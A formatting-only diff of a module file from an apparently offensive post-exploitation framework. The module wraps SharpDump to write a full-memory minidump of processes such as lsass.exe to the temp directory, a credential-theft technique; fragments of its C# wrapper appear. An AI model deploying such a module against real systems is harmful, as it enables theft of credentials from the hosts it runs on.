@@ -4,7 +4,10 @@ authors:
   - name: Anthony Rose
     handle: Cx01N
     link: https://twitter.com/Cx01N_
-description: This module uses SharpDump which is a C# of the PowerShell Out-MiniDump. This module uses P/Invoke to call MiniDumpWriteDump from dbghelp.dll and create a full-memory minidump of a target process such as lsass.exe. The resulting dump is compressed and saved to disk as a .bin file in the system's temp directory.
+description: This module uses SharpDump which is a C# of the PowerShell Out-MiniDump.
+  This module uses P/Invoke to call MiniDumpWriteDump from dbghelp.dll and create
+  a full-memory minidump of a target process such as lsass.exe. The resulting dump
+  is compressed and saved to disk as a .bin file in the system's temp directory.
 software: ''
 tactics: [TA0006, TA0007]
 techniques: [T1003, T1555.03]
@@ -23,14 +26,11 @@ options:
     suggested_values: []
 csharp:
   UnsafeCompile: false
-  CompatibleDotNetVersions:
-    - Net35
-    - Net40
+  CompatibleDotNetVersions: [Net35, Net40]
   Code: |
     using System;
     using System.IO;
     using SharpDump;
-
     public static class Program
     {
         public static void Main(string[] args)
@@ -39,7 +39,6 @@ csharp:
             string result = DumpProcessMemory(processID);
             Console.WriteLine(result);
         }
-
         public static string DumpProcessMemory(string processID = "")
         {
             using (StringWriter stringWriter = new StringWriter())
@@ -48,11 +47,9 @@ csharp:
                 TextWriter originalError = Console.Error;
                 Console.SetOut(stringWriter);
                 Console.SetError(stringWriter);
-
                 try
                 {
                     string[] args = processID.Split(' ');
-
                     string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
                     string dumpDir = $"{systemRoot}\\Temp\\";
                     if (!Directory.Exists(dumpDir))
@@ -85,7 +82,6 @@ csharp:
                     Console.SetOut(originalOutput);
                     Console.SetError(originalError);
                 }
-
                 return stringWriter.ToString();
             }
         }
@@ -95,9 +91,7 @@ csharp:
       Description: SharpDump is a C# port of PowerSploit's Out-Minidump.ps1 functionality.
       Location: SharpDump\
       Language: CSharp
-      CompatibleDotNetVersions:
-        - Net35
-        - Net40
+      CompatibleDotNetVersions: [Net35, Net40]
       ReferenceAssemblies:
         - Name: System.dll
           Location: net40\System.dll
